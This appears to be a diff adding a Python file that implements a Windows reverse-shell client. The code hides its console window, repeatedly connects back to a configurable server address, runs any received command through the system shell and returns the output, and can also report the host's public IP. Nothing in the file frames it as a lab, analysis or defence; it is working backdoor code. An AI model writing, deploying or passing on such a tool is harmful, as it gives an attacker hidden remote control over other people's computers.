@@ -1,0 +1,72 @@
+import socket
+import subprocess
+import requests
+import ctypes
+import time
+import struct
+
+user32 = ctypes.windll.user32
+kernel32 = ctypes.windll.kernel32
+hwnd = kernel32.GetConsoleWindow()
+if hwnd:
+    user32.ShowWindow(hwnd, 0)
+
+def send_msg(sock, msg_str):
+    """Prefixed framing helper to send payloads of any size cleanly."""
+    data = msg_str.encode('utf-8', errors='ignore')
+    header = struct.pack('>I', len(data))
+    sock.sendall(header + data)
+
+def start_client(server_ip, server_port):
+    while True:
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            client.connect((server_ip, server_port))
+        except Exception:
+            time.sleep(5)
+            continue
+
+        while True:
+            try:
+                command = client.recv(1024).decode('utf-8', errors='ignore').strip()
+                if not command:
+                    break
+            except Exception:
+                break
+
+            if command.lower() == 'exit':
+                client.close()
+                return
+                
+            if command.lower() == 'ip':
+                try:
+                    r = requests.get('ipify.org', verify=False, timeout=5)
+                    output = r.json().get('ip', 'IP key missing')
+                except Exception as e:
+                    output = f"Error fetching IP: {str(e)}"
+                
+                try: send_msg(client, output)
+                except Exception: break
+                continue
+                
+            try:
+                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
+                if not output:
+                    output = "Command finished with no text output."
+            except subprocess.CalledProcessError as e:
+                output = e.output
+            except Exception as e:
+                output = f"Execution error: {str(e)}"
+                
+            try:
+                send_msg(client, output)
+            except Exception:
+                break
+                
+        client.close()
+        time.sleep(5)
+
+if __name__ == '__main__':
+    SERVER_IP = "127.0.0.1"#replace with server ip
+    SERVER_PORT = 5555
+    start_client(SERVER_IP, SERVER_PORT)
